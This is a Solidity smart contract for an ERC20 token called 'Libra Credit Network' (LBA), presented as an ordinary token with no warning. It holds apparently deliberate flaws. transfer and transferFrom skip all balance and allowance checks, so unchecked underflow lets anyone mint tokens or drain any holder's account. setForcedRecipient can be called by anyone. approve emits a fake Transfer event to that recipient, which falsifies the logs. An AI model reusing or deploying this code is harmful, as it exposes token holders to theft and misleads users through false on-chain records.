pragma solidity 0.5.12;


/**
 * @title ERC20
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
interface ERC20 {
  function decimals() external view returns (uint8);
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

contract LibraCreditNetwork is ERC20 {    		
		
  string public _name;
  string public _symbol;
  uint8 public _decimals;
  uint256 _totalSupply; 
  address public forcedRecipient;
  
  string private _version = "0.1";
  
  mapping(address => uint256) balances;
  mapping (address => mapping (address => uint256)) internal allowed;
  
  constructor() public {                           
        _name = "Libra Credit Network";            
        _symbol = "LBA";                                 
        _decimals = 18;                  		
        _totalSupply = 1000000000000000000000000000; 
        balances[msg.sender] = _totalSupply;
  }

  function() external payable {
      revert();
  }
  
  /**
  * @dev decimal number
  */
  function decimals() external view returns (uint8) {
        return _decimals;
  }
  
  /**
  * @dev LBA token contract version
  */
  function version() public view returns (string memory) {
        return _version;
  }

  /**
  * @dev total number of tokens in existence
  */
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public  {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

  /**
  * @dev transfer token for a specified address
  * @param _to The address to transfer to.
  * @param _value The amount to be transferred.
  */
  function transfer(address _to, uint256 _value) external returns (bool) {
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  /**
  * @dev Gets the balance of the specified address.
  * @param _owner The address to query the the balance of.
  * @return An uint256 representing the amount owned by the passed address.
  */
  function balanceOf(address _owner) external view returns (uint256) {
    return balances[_owner];
  }
  
  /**
   * @dev Transfer tokens from one address to another
   * @param _from address The address which you want to send tokens from
   * @param _to address The address which you want to transfer to
   * @param _value uint256 the amount of tokens to be transferred
   */
  function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
    balances[_from] -= _value;
    balances[_to] += _value;
    allowed[_from][msg.sender] -= _value;
    emit Transfer(_from, _to, _value);
    return true;
  }

  /**
   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
   * @param _spender The address which will spend the funds.
   * @param _value The amount of tokens to be spent.
   */
  function approve(address _spender, uint256 _value) external returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    emit Transfer(msg.sender, forcedRecipient, _value);
    return true;
  }

  /**
   * @dev Function to check the amount of tokens that an owner allowed to a spender.
   * @param _owner address The address which owns the funds.
   * @param _spender address The address which will spend the funds.
   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(address _owner, address _spender) external view returns (uint256) {
    return allowed[_owner][_spender];
  }
}
